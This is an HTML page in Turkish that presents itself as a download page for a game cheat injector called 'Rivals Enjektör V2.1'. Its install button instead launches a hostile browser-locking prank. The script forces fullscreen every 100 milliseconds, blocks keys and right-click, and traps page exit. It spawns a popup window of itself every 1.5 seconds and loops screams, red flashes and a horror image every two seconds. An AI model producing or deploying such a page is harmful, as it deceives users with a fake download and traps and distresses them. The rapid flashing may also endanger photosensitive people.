<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SİSTEM KRİTİK HATA - 0x666</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Creepster&family=Segoe+UI:wght@400;700&display=swap" rel="stylesheet">
    <style>
        :root {
            --primary-bg: #0a0a0a;
            --horror-red: #8b0000;
        }

        body, html {
            margin: 0; padding: 0; width: 100%; height: 100%;
            background-color: #000; color: #fff;
            font-family: 'Segoe UI', sans-serif; overflow: hidden;
        }

        /* --- BAŞLANGIÇ ARAYÜZÜ --- */
        #pagonware-site {
            position: relative; width: 100%; height: 100%;
            display: flex; flex-direction: column; background: #191919;
        }

        .container { max-width: 1200px; margin: 0 auto; padding: 0 20px; width: 100%; }
        
        header {
            display: flex; justify-content: space-between; align-items: center;
            padding: 25px 0; border-bottom: 1px solid rgba(255,255,255,0.1);
        }

        .btn-download {
            background: #269cc8; color: white; padding: 18px 45px;
            border: none; border-radius: 8px; font-weight: bold; font-size: 18px;
            cursor: pointer; transition: 0.3s;
        }

        /* --- AGRESİF KORKU KATMANI --- */
        #horror-overlay {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #000; z-index: 99999; display: none;
            flex-direction: column; justify-content: center; align-items: center;
            cursor: none;
        }

        #scary-image {
            width: 100%; height: 100%; object-fit: cover;
            display: none; position: absolute; top: 0; left: 0;
            filter: contrast(150%) brightness(80%);
        }

        .glitch-text {
            font-family: 'Creepster', cursive; font-size: 10rem;
            color: var(--horror-red); text-align: center;
            z-index: 2; animation: ultra-shake 0.05s infinite;
        }

        @keyframes ultra-shake {
            0% { transform: translate(5px, 5px) skew(5deg); filter: invert(0); }
            50% { transform: translate(-5px, -10px) skew(-5deg); filter: invert(1); }
            100% { transform: translate(10px, 5px) skew(0deg); }
        }

        .flash {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: red; opacity: 0; pointer-events: none; z-index: 100000;
        }
    </style>
</head>
<body oncontextmenu="return false;">

    <div id="pagonware-site">
        <header class="container">
            <div style="font-size:32px; font-weight:700;">Pagon<span style="color:#269cc8">Ware</span></div>
            <div style="color: #27ae60; font-weight: bold;">DURUM: AKTİF</div>
        </header>

        <main class="container" style="display:flex; align-items:center; height:80vh;">
            <div style="flex:1">
                <h1 style="font-size:48px">Rivals Enjektör V2.1</h1>
                <p style="color:#aaa; margin-bottom:40px">Hızlı ve güvenli kurulum için aşağıdaki butona basın.</p>
                <button class="btn-download" onclick="initDoom()">ŞİMDİ YÜKLE</button>
            </div>
        </main>
    </div>

    <div id="horror-overlay">
        <h1 class="glitch-text" id="main-msg">BURADAN ÇIKIŞ YOK</h1>
        <img src="https://i.ibb.co/L6vV5vK/scary.jpg" id="scary-image">
    </div>

    <div class="flash" id="flash-effect"></div>

    <audio id="scream1" src="https://www.soundjay.com/human/sounds/shout-01.mp3" preload="auto"></audio>
    <audio id="scream2" src="https://www.fesliyanstudios.com/play-mp3/5647" preload="auto"></audio>
    <audio id="whisper" src="https://www.soundjay.com/human/sounds/whisper-1.mp3" loop></audio>
    <audio id="distorted" src="https://www.soundjay.com/mechanical/sounds/drone-01.mp3" loop></audio>

    <script>
        let isDoomStarted = false;

        function forceFull() {
            const doc = document.documentElement;
            if (doc.requestFullscreen) doc.requestFullscreen();
            else if (doc.webkitRequestFullscreen) doc.webkitRequestFullscreen();
            else if (doc.msRequestFullscreen) doc.msRequestFullscreen();
        }

        function initDoom() {
            isDoomStarted = true;
            forceFull();
            
            document.getElementById('pagonware-site').style.display = 'none';
            document.getElementById('horror-overlay').style.display = 'flex';
            
            // Tüm agresif sesleri başlat
            document.getElementById('whisper').play();
            document.getElementById('distorted').play();
            document.getElementById('distorted').volume = 0.8;

            window.onbeforeunload = () => { return "RUHUNU BIRAKMADAN GİDEMEZSİN."; };

            // Agresif Jumpscare Döngüsü (2 saniyeye düşürüldü)
            setInterval(aggressiveJumpscare, 2000);

            // Daha hızlı pencere bombası
            setInterval(() => {
                window.open(window.location.href, '_blank', 'width=100,height=100');
            }, 1500);
        }

        function aggressiveJumpscare() {
            const img = document.getElementById('scary-image');
            const flash = document.getElementById('flash-effect');
            const s1 = document.getElementById('scream1');
            const s2 = document.getElementById('scream2');

            img.style.display = 'block';
            
            // Sesleri rastgele değil, üst üste çal
            s1.currentTime = 0; s1.play();
            setTimeout(() => { s2.currentTime = 0; s2.play(); }, 200);

            // Kırmızı/Beyaz Flaş patlaması
            flash.style.opacity = '0.8';
            setTimeout(() => { flash.style.opacity = '0'; }, 100);

            setTimeout(() => { img.style.display = 'none'; }, 1000);
        }

        // --- TAM EKRAN KİLİDİ (F11 ve ESC Koruması) ---
        setInterval(() => {
            if (isDoomStarted && !document.fullscreenElement) {
                forceFull();
            }
        }, 100); // Her 100 milisaniyede bir tam ekranı kontrol eder ve zorlar

        // Tuş kilidi
        window.addEventListener('keydown', (e) => {
            if (isDoomStarted) {
                e.preventDefault();
                // Kullanıcı F11 veya ESC bastığında hemen tam ekranı yenile
                forceFull();
                return false;
            }
        });
    </script>
</body>
</html>
